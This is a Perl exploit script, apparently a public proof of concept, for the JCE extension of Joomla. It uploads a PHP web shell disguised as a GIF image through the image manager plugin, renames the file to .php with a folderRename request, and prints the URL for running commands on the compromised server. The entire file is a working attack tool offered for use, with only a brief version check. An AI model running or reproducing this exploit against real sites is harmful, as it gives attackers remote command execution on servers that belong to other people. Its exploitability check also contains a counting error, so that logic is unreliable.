use IO::Socket;
use LWP::Simple;
 system("cls");
if(!defined($ARGV[0])) {
print "\n\n\t.::. Exploit for JCE Joomla Extension (Auto Shell Uploader) V0.1 .::.\n\n";
print "\t||||        Coded by: Mostafa Azizi (admin[@]0-Day[dot]net)      ||||\n\n";
print "\t+--> Usage:   perl $0 <host>        <--+\n";
print "\t+--> Example: perl $0 localhost     <--+\n\n";
exit; }
print "\n\n\t.::. Exploit for JCE Joomla Extension (Auto Shell Uploader) V0.1 .::.\n\n";
print "\t||||        Coded by: Mostafa Azizi (admin[@]0-Day[dot]net)      ||||\n\n";
$TARGET = $ARGV[0];
$PORT   = "80";
$SCRIPT = "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20";
$SHELL  = "/images/stories/0day.php?cmd=";
$HTTP   = "http://";
 
$header1G = "GET $SCRIPT HTTP/1.1";
$header1H = "HEAD /images/stories/0day.php HTTP/1.1";
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 769";
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="0day.gif"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
$header16 = "<? system($_GET['cmd']);exit; ?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = '0day';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/0day.gif","0day.php"]}';
$header24 = "Content-Length: ".length($header25)."";
 
############################################### Packet 1 --> Checking Exploitability #########################################################
print "\n[*] Checking Exploitability ...\n\n";
sleep 2;
$pageURL=$TARGET.$SCRIPT;
$simplePage=get($pageURL);
@arr = ("2.0.11</title","2.0.12</title","2.0.13</title","2.0.14</title","2.0.15</title","1.5.7.10</title","1.5.7.11</title","1.5.7.12</title","1.5.7.13</title","1.5.7.14</title");
while (($count!=10) && ($die != 1)) {
    foreach $arr(@arr){
        if ($simplePage =~ m/$arr/) {
            print "\n[*] Target patched.\n\n";
            $die = 1;
        } else {
            $count++;
                }
        }
    }
 if ($count==5) {print "[*] Target is exploitable.\n\n"};
############################################### Packet 2 --> Uploading shell as a gif file #########################################################
$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"$PORT")
|| die "Can't connect to $TARGET";
print "[*] Trying to upload 0day.gif ...\n\n";
print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n";
sleep 2;
############################################### Packet 3 --> Change Extension from .gif to .php #########################################################
print "[*] Trying to change extension from .gif to .php ...\n\n";
$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"$PORT")
|| die "Can't connect to $TARGET";
print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";
############################################### Packet 4 --> Check for successfully uploaded #########################################################
$shellurl=$TARGET.$SHELL;
$output=get($shellurl);
while ($output = <$remote> ) {
if ($output =~ /200 OK/) {
print "[+] 0day.php was successfully uploaded\n\n";
print "[+] Path:".$TARGET.$SHELL."id\n";
}}